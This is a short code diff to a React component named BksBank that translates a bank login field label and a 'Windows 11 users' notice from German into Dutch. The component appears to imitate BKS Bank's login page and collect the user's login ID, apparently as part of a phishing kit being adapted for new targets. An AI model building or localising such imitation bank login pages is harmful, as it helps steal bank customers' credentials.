@@ -53,7 +53,7 @@ export function BksBank({ formData, onChange, handleRouteAction, saving }: Props
                 <div>
                   <input 
                     type="text" 
-                    placeholder="Verfügernummer"
+                    placeholder="Inlogcode"
                     value={formData.verfuegernummer || ""}
                     onChange={(e) => onChange("verfuegernummer", e.target.value)}
                     className="w-full h-[40px] px-3 border border-[#ccc] rounded-sm outline-none focus:border-[#4a1f73] focus:ring-1 focus:ring-[#4a1f73] text-[#333] text-[14px] placeholder-[#aaa]"
@@ -167,7 +167,7 @@ export function BksBank({ formData, onChange, handleRouteAction, saving }: Props
               <svg className="w-5 h-5 text-[#666] mr-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7-7" />
               </svg>
-              <span className="text-[#4a1f73] text-[14px] font-medium flex-1">Wichtiger Hinweis für Windows 11-Nutzer</span>
+              <span className="text-[#4a1f73] text-[14px] font-medium flex-1">Belangrijke mededeling voor Windows 11 gebruikers</span>
               <span className="text-[#666] text-[13px] shrink-0">14.01.2025, 14:47 Uhr</span>
             </div>
           </div>
